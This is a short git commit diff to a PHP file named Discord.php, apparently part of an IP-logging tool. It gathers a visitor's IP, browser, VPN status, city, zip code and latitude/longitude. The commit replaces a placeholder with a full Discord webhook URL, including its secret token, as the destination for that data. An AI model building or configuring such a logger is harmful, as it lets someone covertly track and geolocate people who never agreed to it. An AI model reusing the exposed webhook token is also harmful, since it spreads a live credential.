b03fb6aec82b482b42ac252d64bee77072c743ef
Shame-bin <153696389+Shame-bin@users.noreply.github.com>
2024-09-14 11:36:50 -0500

    Update Discord.php

--- attachments/Discord.php
+++ attachments/Discord.php
@@ -56,7 +56,7 @@ class Discord
         global $IP, $Browser, $Date, $Time, $VPN, $Country, $CountryCode, $Region, $City, $Zip, $Lat, $Lon, $WebhookName, $Flag;
 
 		//Insert FULL webhook URL here (URL begins with: https://discord.com/api/webhooks/)
-        $Webhook = "FULLURLHERE";
+        $Webhook = "https://discord.com/api/webhooks/1284553331049762816/X0IkBPmg6z46dkFlgPLfMDe7cfK2zI1rCwlHxLaP3aHQ5ioqHNPkVPA9ach2O3SLC0tp";
 
         $InfoArr = array(
             "username" => "$WebhookName",
